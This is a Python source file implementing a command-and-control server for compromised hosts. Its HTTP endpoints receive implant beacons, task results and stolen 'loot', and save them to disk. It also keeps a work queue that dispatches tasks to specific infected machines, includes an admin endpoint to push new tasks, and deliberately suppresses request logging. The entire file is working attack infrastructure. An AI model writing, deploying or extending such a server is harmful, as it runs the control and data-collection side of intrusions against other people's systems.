import json
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Dict
from urllib.parse import urlparse, parse_qs

_LOCK = threading.Lock()


class C2State:
    def __init__(self, base_dir: str = "c2_loot", work_file: str = "c2_work.json", bearer: str = ""):
        self.base = Path(base_dir)
        for sub in ("beacons", "results", "loot", "logs"):
            (self.base / sub).mkdir(parents=True, exist_ok=True)
        self.work_file = Path(work_file)
        self.bearer = bearer

    def authed(self, headers) -> bool:
        if not self.bearer:
            return True
        return headers.get("Authorization") == f"Bearer {self.bearer}"

    def _load_queue(self):
        if self.work_file.exists():
            return json.loads(self.work_file.read_text())
        return []

    def pop_work(self, cluster: str = None) -> Dict[str, Any] | None:
        with _LOCK:
            q = self._load_queue()
            if not q:
                return {"work": None}
            # highest priority first; honor host targeting if set
            q.sort(key=lambda s: -s.get("work", {}).get("priority", 0))
            for i, spec in enumerate(q):
                th = spec["work"].get("target_host")
                if th is None or th == cluster:
                    q.pop(i)
                    return spec
            return {"work": None}  # this host has no targeted work right now

    def push_work(self, spec: Dict[str, Any]):
        with _LOCK:
            q = self._load_queue()
            q.append(spec)
            self.work_file.write_text(json.dumps(q, indent=2))

    def save(self, sub: str, obj: Any, prefix: str = "") -> Path:
        with _LOCK:
            p = self.base / sub / f"{prefix}{int(time.time())}_{uuid.uuid4().hex[:8]}.json"
            p.write_text(json.dumps(obj, indent=2))
            return p

    def summary(self) -> Dict[str, Any]:
        beacons = list((self.base / "beacons").glob("*.json"))
        results = list((self.base / "results").glob("*.json"))
        queue = self._load_queue()
        return {"beacons": len(beacons), "results": len(results),
                "queued_work": len(queue),
                "last_beacons": [json.loads(b.read_text()).get("host", b.name) for b in beacons[-20:]]}


def make_handler(state: C2State):
    class H(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            pass  # quiet; Section 6.1

        def _json(self, code: int, obj: Any):
            body = json.dumps(obj).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _body(self) -> Dict[str, Any]:
            n = int(self.headers.get("Content-Length", 0))
            return json.loads(self.rfile.read(n)) if n else {}

        def do_GET(self):
            u = urlparse(self.path)
            if not state.authed(self.headers):
                return self._json(401, {"error": "auth"})
            if u.path == "/status":
                return self._json(200, state.summary())
            if u.path == "/work":
                q = parse_qs(u.query)
                cluster = q.get("cluster", ["?"])[0]
                spec = state.pop_work(cluster=cluster)
                state.save("logs", {"event": "work_dispatch",
                                    "cluster": cluster, "work": spec})
                return self._json(200, spec if spec.get("work") else {"work": None})
            return self._json(404, {"error": "nf"})

        def do_POST(self):
            u = urlparse(self.path)
            if not state.authed(self.headers):
                return self._json(401, {"error": "auth"})
            try:
                body = self._body()
            except Exception:
                return self._json(400, {"error": "bad_json"})
            if u.path == "/beacon":
                p = state.save("beacons", body, prefix=str(body.get("beacon_type", "b")) + "_")
                return self._json(200, {"ok": True, "stored": str(p)})
            if u.path == "/result":
                p = state.save("results", body)
                return self._json(200, {"ok": True, "stored": str(p)})
            if u.path == "/loot":
                p = state.save("loot", body)
                return self._json(200, {"ok": True, "stored": str(p)})
            if u.path == "/admin/push-work":
                state.push_work(body)
                return self._json(200, {"ok": True, "queued": len(state._load_queue())})
            return self._json(404, {"error": "nf"})
    return H


def run_server(host: str, port: int, bearer: str = "", base_dir: str = "c2_loot"):
    state = C2State(base_dir=base_dir, bearer=bearer)
    httpd = ThreadingHTTPServer((host, port), make_handler(state))
    print(f"[c2] listening on {host}:{port}  (bearer set: {bool(bearer)})  loot -> {state.base.resolve()}")
    print(f"[c]  status: curl http://{host}:{port}/status")
    httpd.serve_forever()